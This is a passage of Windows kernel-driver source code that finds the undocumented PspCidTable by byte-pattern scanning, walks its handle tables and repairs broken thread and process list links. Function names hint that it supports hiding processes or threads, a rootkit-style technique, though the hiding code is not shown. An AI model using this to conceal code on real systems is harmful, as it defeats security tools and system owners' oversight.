				ULONG64 ul_movJmp = ul_callJmp + i + i_movCode + 7;
				//DbgPrint("[LYSM] ul_movJmp:%p\n", ul_movJmp);
				// 得到 PspCidTable
				*tableAddr = ul_movJmp;
				return TRUE;
			}
		}
		LOG_DEBUG("PsLookupProcessByProcessId  find NoTable 1\n");
	}

	// 前 40字节没有 call
	else {
		// 直接在 PsLookupProcessByProcessId 找 PspCidTable
		for (INT i = 0; i < 70; i++) {
			if (*(PUCHAR)(ul_funcAddr + i) == 0x49 &&
				*(PUCHAR)(ul_funcAddr + i + 1) == 0x8b &&
				*(PUCHAR)(ul_funcAddr + i + 2) == 0xdc &&
				*(PUCHAR)(ul_funcAddr + i + 3) == 0x48 &&
				*(PUCHAR)(ul_funcAddr + i + 4) == 0x8b &&
				*(PUCHAR)(ul_funcAddr + i + 5) == 0xd1 &&
				*(PUCHAR)(ul_funcAddr + i + 6) == 0x48 &&
				*(PUCHAR)(ul_funcAddr + i + 7) == 0x8b) {
				// 解析 mov 地址
				INT i_movCode = *(INT*)(ul_funcAddr + i + 6 + 3);
				//DbgPrint("[LYSM] i_movCode:%X\n", i_movCode);
				ULONG64 ul_movJmp = ul_funcAddr + i + 6 + i_movCode + 7;
				//DbgPrint("[LYSM] ul_movJmp:%p\n", ul_movJmp);
				// 得到 PspCidTable
				*tableAddr = ul_movJmp;
				return TRUE;
			}
		}
		LOG_DEBUG("PsLookupProcessByProcessId  find NoTable2\n");
	}
	LOG_DEBUG("PsLookupProcessByProcessId  find NoTable\n");
	return FALSE;
}

/* 解析一级表
	BaseAddr：一级表的基地址
	index1：第几个一级表
	index2：第几个二级表
*/
VOID parse_table_1(ULONG64 BaseAddr, INT index1, INT index2) {

	//DbgPrint("[LYSM] BaseAddr 1:%p\n", BaseAddr);

	// 获取系统版本
	RTL_OSVERSIONINFOEXW OSVersion = { 0 };
	OSVersion.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&OSVersion);

	// 遍历一级表（每个表项大小 16 ），表大小 4k，所以遍历 4096/16 = 526 次
	PEPROCESS p_eprocess = NULL;
	PETHREAD p_ethread = NULL;
	INT i_id = 0;
	for (INT i = 0; i < 256; i++) {
		if (!MmIsAddressValid((PVOID64)(BaseAddr + i * 16))) {
			//DbgPrint("[LYSM] 非法地址:%p\n", BaseAddr + i * 16);
			continue;
		}
		// win10
		if (OSVersion.dwMajorVersion == 10 && OSVersion.dwMinorVersion == 0) {
			ULONG64 ul_recode = *(PULONG64)(BaseAddr + i * 16);
			// 解密
			ULONG64 ul_decode = (LONG64)ul_recode >> 0x10;
			ul_decode &= 0xfffffffffffffff0;
			// 判断是进程还是线程
			i_id = i * 4 + 1024 * index1 + 512 * index2 * 1024;
			if (PsLookupProcessByProcessId((HANDLE)i_id, &p_eprocess) == STATUS_SUCCESS) {
				//DbgPrint("[LYSM] PID:%d , i:%d , addr:%p , object:%p\n", i_id, i, BaseAddr + i * 0x10, ul_decode);
			}
			else if (PsLookupThreadByThreadId((HANDLE)i_id, &p_ethread) == STATUS_SUCCESS) {
				//DbgPrint("[LYSM] TID:%d , i:%d , addr:%p , object:%p\n", i_id, i, BaseAddr + i * 0x10, ul_decode);
			}

		}
		// win7
		if (OSVersion.dwMajorVersion == 6 && OSVersion.dwMinorVersion == 1) {
			ULONG64 ul_recode = *(PULONG64)(BaseAddr + i * 16);
			// 解密
			ULONG64 ul_decode = ul_recode & 0xfffffffffffffff0;
			// 判断是进程还是线程
			i_id = i * 4 + 1024 * index1 + 512 * index2 * 1024;
			if (PsLookupProcessByProcessId((HANDLE)i_id, &p_eprocess) == STATUS_SUCCESS) {
				//DbgPrint("[LYSM] PID:%d , i:%d , addr:%p , object:%p\n", i_id, i, BaseAddr + i * 0x10, ul_decode);
			}
			else if (PsLookupThreadByThreadId((HANDLE)i_id, &p_ethread) == STATUS_SUCCESS) {
				//DbgPrint("[LYSM] TID:%d , i:%d , addr:%p , object:%p\n", i_id, i, BaseAddr + i * 0x10, ul_decode);
			}
			else { continue; }
		}
	}
}

/* 解析二级表
	BaseAddr：二级表基地址
	index2：第几个二级表
*/
VOID parse_table_2(ULONG64 BaseAddr, INT index2) {

	//DbgPrint("[LYSM] BaseAddr 2:%p\n", BaseAddr);

	// 遍历二级表（每个表项大小 8）,表大小 4k，所以遍历 4096/8 = 512 次
	ULONG64 ul_baseAddr_1 = 0;
	for (INT i = 0; i < 512; i++) {
		if (!MmIsAddressValid((PVOID64)(BaseAddr + i * 8))) {
			//DbgPrint("[LYSM] 非法二级表指针（1）:%p\n", BaseAddr + i * 8);
			continue;
		}
		if (!MmIsAddressValid((PVOID64) * (PULONG64)(BaseAddr + i * 8))) {
			//DbgPrint("[LYSM] 非法二级表指针（2）:%p\n", BaseAddr + i * 8);
			continue;
		}
		ul_baseAddr_1 = *(PULONG64)(BaseAddr + i * 8);
		parse_table_1(ul_baseAddr_1, i, index2);
	}
}

/* 解析三级表
	BaseAddr：三级表基地址
*/
VOID parse_table_3(ULONG64 BaseAddr) {

	//DbgPrint("[LYSM] BaseAddr 3:%p\n", BaseAddr);

	// 遍历三级表（每个表项大小 8）,表大小 4k，所以遍历 4096/8 = 512 次
	ULONG64 ul_baseAddr_2 = 0;
	for (INT i = 0; i < 512; i++) {
		if (!MmIsAddressValid((PVOID64)(BaseAddr + i * 8))) { continue; }
		if (!MmIsAddressValid((PVOID64) * (PULONG64)(BaseAddr + i * 8))) { continue; }
		ul_baseAddr_2 = *(PULONG64)(BaseAddr + i * 8);
		parse_table_2(ul_baseAddr_2, i);
	}
}

/* 遍历进程和线程
	cidTableAddr：PspCidTable 地址
*/
BOOLEAN enum_PspCidTable(ULONG64 cidTableAddr) {

	// 获取 _HANDLE_TABLE 的 TableCode
	ULONG64 ul_tableCode = *(PULONG64)(((ULONG64) * (PULONG64)cidTableAddr) + 8);
	//DbgPrint("[LYSM] ul_tableCode:%p\n", ul_tableCode);

	// 取低 2位（二级制11 = 3）
	INT i_low2 = ul_tableCode & 3;
	//DbgPrint("[LYSM] i_low2:%X\n", i_low2);

	// 一级表
	if (i_low2 == 0) {
		// TableCode 低 2位抹零（二级制11 = 3）
		parse_table_1(ul_tableCode & (~3), 0, 0);
	}
	// 二级表
	else if (i_low2 == 1) {
		// TableCode 低 2位抹零（二级制11 = 3）
		parse_table_2(ul_tableCode & (~3), 0);
	}
	// 三级表
	else if (i_low2 == 2) {
		// TableCode 低 2位抹零（二级制11 = 3）
		parse_table_3(ul_tableCode & (~3));
	}
	else {
		//DbgPrint("[LYSM] i_low2 非法！\n");
		return FALSE;
	}

	return TRUE;
}




typedef PHANDLE_TABLE_ENTRY(NTAPI* fExMapHandleToPointer)(
	 PHANDLE_TABLE HandleTable,
	 HANDLE Handle
	);

typedef PHANDLE_TABLE_ENTRY(NTAPI* fExUnlockHandleTableEntry)(
	 PHANDLE_TABLE HandleTable,
	 PHANDLE_TABLE_ENTRY TabelEntry
	);


typedef NTSTATUS (NTAPI* fPspReferenceCidTableEntry)(
	HANDLE hPID,
	ULONG TableType
	);


typedef HANDLE(NTAPI* fExCreateHandleEx)(
	PHANDLE_TABLE HandleTable,
	PHANDLE_TABLE_ENTRY HandleTableEntry,
	ULONGLONG A,
    ULONGLONG B,
	ULONGLONG C
	);







typedef __int64 (__fastcall * fPspInsertThread)(
	char* DmaAdapter,
	PEPROCESS a2,
	__int64 a3,
	PVOID a4,
	int a5,
	PVOID a6,
	__int64 a7,
	__int64 a8,
	__int64 a9,
	PVOID a10,
	struct _DMA_ADAPTER* a11);




ULONG64 PspCidTable = 0;
fExUnlockHandleTableEntry wExCreateHandle = 0;
fnExExDestroyHandle wExDestoryTable = 0;
fExMapHandleToPointer wExMapHandleToPointer = 0;
//fExMapHandleToPointer wExpLookupHandleTableEntry = 0;
fExUnlockHandleTableEntry wExUnlockHandleTableEntry = 0;
//fPspReferenceCidTableEntry wPspReferenceCidTableEntry = 0;
//fnExExDestroyHandle  wExpFreeHandleTableEntry = 0;
fExCreateHandleEx wExCreateHandleEx = 0;




ULONGLONG uPspCreateThread = 0;
ULONGLONG uPspInsertThread = 0;
ULONGLONG uKeStartThread = 0;

//  ExpAllocateHandleTableEntry
//  ExpFreeHandleTableEntry

//WIN7 // (_BYTE*)(*(__int64*)v4) & 0xFFFFFFFFFFFFFFF0ui64
//WIN8 // (_BYTE *)(*(__int64 *)v4 >> 19) & 0xFFFFFFFFFFFFFFF0ui64)
//WIN10 // (_BYTE *)(*(__int64 *)v4 >> 16) & 0xFFFFFFFFFFFFFFF0ui64)


//typedef struct _DISPATCHER_HEADER
//{
//	ULONGLONG unKnow;
//	LIST_ENTRY Link;
//}DISPATCHER_HEADER;


typedef struct _KPROCESS
{
	DISPATCHER_HEADER Header;
	LIST_ENTRY ProfileListHead;
	PVOID DirectoryTableBase;
	LIST_ENTRY ThreadListHead;
}KPROCESS;



extern ULONG_PTR kernelBase;

ULONG ThreadListHead = 0;


int
NTAPI
DetourGetInstructionLength(
	__in PVOID ControlPc
);



ULONGLONG _CODE_GET_REAL_ADDRESS(char* pEl);

LONG _CODE_GET_OFFSET(char* pEl) {

	if (pEl == NULL)
	{
		LOG_DEBUG("_CODE_GET_REAL_ADDRESS  == NULL\n");
		return 0;
	}
	LONG nAdr = *((int*)(pEl + 1));
	return  nAdr;
}


ULONGLONG _CODE_GET_OFFSETx64(char* pEl,int num) {

	if (pEl == NULL){
		LOG_DEBUG("_CODE_GET_REAL_ADDRESS  == NULL\n");
		return 0;
	}
	ULONGLONG nAdr = *((ULONGLONG*)(pEl + num));
	return  nAdr;
}






char* _ASM_GET_CALL(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 5){
			char* p = pAdr + gLen;
			if (p[0] == (char)0xE8){
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return 0;
		}

		if (bLen == 1){
			char* p = pAdr + gLen;
			if (p[0] == (char)0xC3) {
				break;
			}
		}
		gLen += bLen;
		if (bLen == 1)
		{

		}


		//if (gLen > 0x1000)
		//{
		//	LOG_DEBUG("glen >= 0x1000\n");
		//	return 0;
		//}
	}
	return pAdr + gLen;
 }







char* _ASM_FIND_ASMCODE(char* pAdr, // 开始指针
	int num, // 找到的第几个
	char* pCode,
	ULONG pCodeLenthCmp,// 比对长度
	ULONG pCodeLenth, //实际单行汇编长度
	ULONG SerchLenth)  // 查看多长内存
{
	int bi = 0;
	int gLen = 0;
	while (bi < num){
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == pCodeLenth) {
			char* p = pAdr + gLen;
			BOOLEAN Ecmp = TRUE;
			for (ULONG i = 0; i < pCodeLenthCmp; i++){
				if (p[i] != pCode[i]) {
					Ecmp = FALSE;
					break;
				}
			}
			if (Ecmp){
				bi++;
				if (bi == num)
					break;
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}

		if (SerchLenth == 0){
			if (bLen == 1) {
				char* p = pAdr + gLen;
				if (p[0] == (char)0xC3) {
					break;
				}
		    }
	    }
		else if (gLen > SerchLenth){
			LOG_DEBUG("glen >= %08X\n", SerchLenth);
			return NULL;
		}
		gLen += bLen;
	}
	return pAdr + gLen;
}




char* _ASM_FIND_ASMCODE_RET(char* pAdr, // 开始指针
	int num, // 找到的第几个
	char* pCode,
	ULONG pCodeLenthCmp,// 比对长度
	ULONG pCodeLenth, //实际单行汇编长度
	ULONG SerchLenth) {
	return _ASM_FIND_ASMCODE(pAdr, num, pCode, pCodeLenthCmp, pCodeLenth, SerchLenth);
}



char* _ASM_GET_CALL_LENTH(char* pAdr, int num, int Lenth) {
	char pCodeMask[1] = { 0xE8 };
	return _ASM_FIND_ASMCODE(pAdr, num, pCodeMask, 1, 5, Lenth);
}

char* _ASM_TEST_FAR(char* pAdr, int num, int Lenth) {

	char pCodeMask[2] = { 0xF7,0x5 };
	return _ASM_FIND_ASMCODE(pAdr, num, pCodeMask, 2, 10, Lenth);
}


char* _ASM_MOV_DIL(char* pAdr, int num) {
	char pCodeMask[3] = { 0x40,0x8A,0x3D };
	return _ASM_FIND_ASMCODE(pAdr, num, pCodeMask, 3, 7, 0x800);
}


char* _ASM_JMP(char* pAdr, int num) {
	char pCodeMask[1] = { 0xE9};
	return _ASM_FIND_ASMCODE(pAdr, num, pCodeMask, 1, 5, 0x800);
}

char* _ASM_MOVE_R10(char* pAdr, int num) {
	char pCodeMask[2] = { 0x49,0xBA };
	return _ASM_FIND_ASMCODE(pAdr, num, pCodeMask, 2, 10, 0x800);
}

char* _ASM_MOV_R11(char* pAdr, int num) {
	char pCodeMask[3] = { 0x4C,0x8B,0x1D};
	return _ASM_FIND_ASMCODE(pAdr, num, pCodeMask, 3, 7, 0x800);
}


char* _ASM_MOV_RCX_NOW(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 8) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 && 
				p[1] == (char)0xB9) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			//LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_AND_EDI_NOW(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 6) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x81 &&
				p[1] == (char)0xE7) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			//LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_MOV_RDX(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 7) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 &&
				p[1] == (char)0x8B &&
				p[2] == (char)0x15) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			//LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_MOV_RCX(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 7) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 &&
				p[1] == (char)0x8B &&
				p[2] == (char)0xD) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			//LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_GET_JMP(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 5) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0xE9) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_MOV_RAX(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 5) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0xB8) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}


//char* _ASM_MOV_RSI_2(char* pAdr, int num) {
//	int bi = 0;
//	int gLen = 0;
//	while (bi < num)
//	{
//		int bLen = DetourGetInstructionLength(pAdr + gLen);
//		if (bLen == 5) {
//			char* p = pAdr + gLen;
//			if (p[0] == (char)0x8B) {
//				bi++;
//				if (bi == num)
//				{
//					break;
//				}
//			}
//		}
//		if (bLen == 0)
//		{
//			LOG_DEBUG("are you sure blen == 0\n");
//			return NULL;
//		}
//		gLen += bLen;
//		if (gLen > 0x1000)
//		{
//			LOG_DEBUG("glen >= 0x1000\n");
//			return NULL;
//		}
//	}
//	return pAdr + gLen;
//}

char* _ASM_MOV_RSI_2(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 7) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 &&
				p[1] == (char)0x8b &&
				p[2] == (char)0x35) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_MOV_RAX_2(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 7) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 &&
				p[1] == (char)0x8b &&
				p[2] == (char)0x05) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_MOV_RAX_FAR(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 10) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 &&
				p[1] == (char)0xB8) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}


char* _ASM_MOV_EAX_2(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 6) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x8b &&
				p[1] == (char)0x05) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_MOV_RBX(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 7) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 &&
				p[1] == (char)0x8B &&
				p[2] == (char)0x15) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}

char* _ASM_GET_LEA_RCX(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 7) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 && 
				p[1] == (char)0x8D &&
				p[2] == (char)0x0D) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return NULL;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return NULL;
		}
	}
	return pAdr + gLen;
}






ULONGLONG _CODE_GET_REAL_ADDRESS_0(char* pEl, int nCodeSize) {
	if (pEl == NULL){
		LOG_DEBUG("_CODE_GET_REAL_ADDRESS  == NULL\n");
		return 0;
	}
	int nAdr = *((int*)(pEl + nCodeSize));
	return  (ULONGLONG)pEl + nAdr + nCodeSize +4;
}


ULONGLONG _CODE_GET_REAL_QDWORD(char* pEl, int nCodeSize) {
	if (pEl == NULL)
	{
	//	LOG_DEBUG("_CODE_GET_REAL_ADDRESS  == NULL\n");
		return 0;
	}
	ULONGLONG nAdr = *((ULONGLONG*)(pEl + nCodeSize));
	return nAdr;
}

ULONG _CODE_GET_REAL_DWORD(char* pEl, int nCodeSize) {
	if (pEl == NULL)
	{
		//	LOG_DEBUG("_CODE_GET_REAL_ADDRESS  == NULL\n");
		return 0;
	}
	ULONG nAdr = *((ULONG*)(pEl + nCodeSize));
	return nAdr;
}



ULONGLONG _CODE_GET_REAL_ADDRESS(char* pEl) {

	__try
	{
		if (pEl == NULL)
		{
			LOG_DEBUG("_CODE_GET_REAL_ADDRESS  == NULL\n");
			return 0;
		}
		int nAdr = *((int*)(pEl + 1));
		return  (ULONGLONG)pEl + nAdr + 5;
	}
	__except (1) {
		LOG_DEBUG("%s __except %08X", __FUNCTION__, GetExceptionCode());
	}
	return 0;
}


HANDLE  ExCreateHandle(PHANDLE_TABLE HandleTable,
	PHANDLE_TABLE_ENTRY HandleTableEntry) {


	if (wExCreateHandle != 0)
	{
		return wExCreateHandle(HandleTable, HandleTableEntry);
	}

	if (wExCreateHandleEx != 0)
	{
		return wExCreateHandleEx(HandleTable, HandleTableEntry, 0, 0, 0);
	}
	return (HANDLE)-1;
}



BOOLEAN RecoveryThreadList(PETHREAD kThread, BOOLEAN bHide) {

	 BOOLEAN r = FALSE;
	if (kThread != 0)
	{
		PLIST_ENTRY  ThreadListEntry =  (PLIST_ENTRY) ((ULONGLONG)kThread + offsetEthread_ThreadList);
		if (ThreadListEntry->Blink == ThreadListEntry->Flink)
		{
			KAPC_STATE* pApcState = (KAPC_STATE*)((ULONGLONG)kThread + OffsetApcState);
			PEPROCESS kProcess = pApcState->Process;
			PLIST_ENTRY ProcessListEntry = (PLIST_ENTRY)((ULONGLONG)kProcess + offsetKprocess_ProcessList);

			PLIST_ENTRY Entry = ProcessListEntry;
			PLIST_ENTRY NextEntry = Entry->Flink; //v21
			PLIST_ENTRY PrevEntry = Entry->Blink; //v22
			if ((NextEntry->Blink != Entry) || (PrevEntry->Flink != Entry)) {

				LOG_DEBUG(" 会出现蓝屏代码1\n");
				InitializeListHead(Entry);
				wRbuildProcessList();
				r = TRUE;
			}
		}
		PLIST_ENTRY Entry = ThreadListEntry;
		PLIST_ENTRY NextEntry = Entry->Flink;
		PLIST_ENTRY PrevEntry = Entry->Blink;
		if ((NextEntry->Blink != Entry) || (PrevEntry->Flink != Entry)) {

			LOG_DEBUG(" 会出现蓝屏代码2\n");
			InitializeListHead(Entry);
			KAPC_STATE* pApcState = (KAPC_STATE*)((ULONGLONG)kThread + OffsetApcState);
			wRbuildThreadList(pApcState->Process, PsGetThreadProcessId(kThread), bHide);
			r = TRUE;
		}

		DISPATCHER_HEADER* pDispatcherHeader = (DISPATCHER_HEADER*)kThread;
		PLIST_ENTRY HeaderListEntry = &pDispatcherHeader->WaitListHead;
		PLIST_ENTRY vbegin = HeaderListEntry;
		PLIST_ENTRY gEntry = HeaderListEntry->Flink;

		while (vbegin != gEntry)
		{

			KWAIT_BLOCK* pBlock = (KWAIT_BLOCK*)gEntry;
			if (pBlock->WaitType == 2)
			{
				//退出时设置为5
				//pBlock->BlockState = 5
				//sizeof(KWAIT_BLOCK)
				PKTHREAD mThread = pBlock->Thread;
				PKQUEUE pQueue = pBlock->NotificationQueue;
				PLIST_ENTRY QueueListEntry = &pQueue->EntryListHead;

				PLIST_ENTRY Entry = QueueListEntry;
				PLIST_ENTRY NextEntry = Entry->Flink;
				PLIST_ENTRY PrevEntry = Entry->Blink;
				if ((NextEntry->Blink != Entry) || (PrevEntry->Flink != Entry)) {

					LOG_DEBUG(" 会出现蓝屏代码3 尝试修补一下\n");
					InitializeListHead(Entry);
					r = TRUE;
				}
			}
			gEntry = gEntry->Flink;
		}
	}
	return r;
}




BOOLEAN CheckEntryList(PLIST_ENTRY vEntry) {

	__try
	{
		PLIST_ENTRY Entry = vEntry;
		PLIST_ENTRY NextEntry = Entry->Flink;
		PLIST_ENTRY PrevEntry = Entry->Blink;
		if ((NextEntry->Blink != Entry) || (PrevEntry->Flink != Entry)) {
			return FALSE;
		}
		return TRUE;
	}
	__except (1) {

		LOG_DEBUG("%s  except %08X\n", __FUNCTION__, GetExceptionCode());
	}

	return FALSE;
}

//LOG_DEBUG(" 会出现蓝屏代码22  %d  %d    尝试修补一下\n", PsGetCurrentProcessId(), PsGetCurrentThreadId());
//InitializeListHead(ThreadListEntry);





void CheckProcessSingle(PEPROCESS eprocess) {

	//return;
	__try {
		PLIST_ENTRY kEntryThreadList = (PLIST_ENTRY)((ULONGLONG)eprocess + OFFSET_KPROCESS_THREADLIST);
		PLIST_ENTRY eEntryThreadList = (PLIST_ENTRY)((ULONGLONG)eprocess + offsetEprocess_ThreadList);
		if (!CheckEntryList(kEntryThreadList))
		{
			LOG_DEBUG("修 KPROCESS THREADLIST recovery\n");
			InitializeListHead(kEntryThreadList);
		}
		if (!CheckEntryList(eEntryThreadList))
		{
			LOG_DEBUG("修 EPROCESS THREADLIST recovery\n");
			InitializeListHead(eEntryThreadList);
		}

		PLIST_ENTRY tEntry = kEntryThreadList->Flink;
		PLIST_ENTRY nEntry = tEntry->Flink;

		int i = 0;

		while (nEntry != tEntry)
		{
			i++;
			PETHREAD ethread = (PETHREAD) ((ULONGLONG)nEntry - OFFSER_KTHREAD_THREADLIST);
			//ObReferenceObject(ethread);
			HANDLE threadID = PsGetThreadId(ethread);
			
			PETHREAD ethreadV = 0;
			PsLookupThreadByThreadId(threadID, &ethreadV);
			if (ethreadV != 0)
			{
				if (RecoveryThreadList(ethreadV, FALSE))
				{
					LOG_DEBUG("CheckProcessSingle processid %d  tid %d\n", PsGetProcessId(eprocess), threadID);
				} 
				ObDereferenceObject(ethreadV);
			}

			if (i > 1000)
			{
				break;
			}
			nEntry = nEntry->Flink;
		}

	}
	__except (1) {

		LOG_DEBUG("%s  except %08X\n", __FUNCTION__, GetExceptionCode());
	}


}


void CheckProcessAll() {

	__try {

		if (offsetKprocess_ProcessList != 0)
		{
			PEPROCESS systemPEProcess = 0;
			PsLookupProcessByProcessId((HANDLE)4, &systemPEProcess);
			if (systemPEProcess != 0)
			{
				PLIST_ENTRY nEntry =  (PLIST_ENTRY) ((ULONGLONG)systemPEProcess + offsetKprocess_ProcessList);
				PLIST_ENTRY NowEntry = nEntry->Flink;
				int i = 0;
				while (NowEntry != nEntry)
				{
					PEPROCESS gEprocess = (PEPROCESS)((ULONGLONG)NowEntry - offsetKprocess_ProcessList);


					HANDLE dwPID = (HANDLE)(*(DWORD64*)((DWORD64)gEprocess + (g_offset - 1) * 8));
					PEPROCESS tEprocess = 0;
					NTSTATUS status = PsLookupProcessByProcessId(dwPID, &tEprocess);
					if (tEprocess != 0)
					{
						CheckProcessSingle(tEprocess);
						ObDereferenceObject(tEprocess);
						//LOG_DEBUG("Eprocess Error %d  %08X\n ", dwPID, status);
					}
					i++;
					if (i > 1000)
					{
						break;
					}
					NowEntry = NowEntry->Flink;
				}
				ObDereferenceObject(systemPEProcess);
			}
		}
	}
	__except (1) {
		LOG_DEBUG("%s  except %08X\n", __FUNCTION__, GetExceptionCode());
	}





}

BOOLEAN _CREATE_THREAD_NOTIFY_ROUTINE(
	IN HANDLE  ProcessId,
	IN HANDLE  ThreadId,
	IN BOOLEAN  Create
) {
	
	TABLE_HANDLE_INFO nTable = { 0 };
	nTable.hID = ProcessId;

	PTABLE_HANDLE_INFO pGr = wGetEntryProcessAvl(&nTable);
	if (pGr != 0)
	{

		if (Create == 1)
		{
			LOG_DEBUG("PspExit thread %d  processid %d  curprocesid %d\n", ThreadId, ProcessId, PsGetCurrentProcessId());
		}
		else if (Create == 0) {
			LOG_DEBUG("TerminateExit thread %d  processid %d \n", ThreadId, ProcessId);
		}
		//wAddPspCidTableThread(ThreadId);
		wRecoveryidTableThread(ProcessId, ThreadId);

	//	RecoveryThreadList(pGr->);
		return TRUE;
	}

	PETHREAD kThread = 0;
	PsLookupThreadByThreadId(ThreadId, &kThread);
	if (kThread != 0)
	{
		ObDereferenceObject(kThread);
		RecoveryThreadList(kThread,FALSE);
	}
	CheckProcessAll();
	return FALSE;
}



void PcreateProcessNotifyRoutine(
	HANDLE ParentId,
	HANDLE ProcessId,
	BOOLEAN Create
)
{
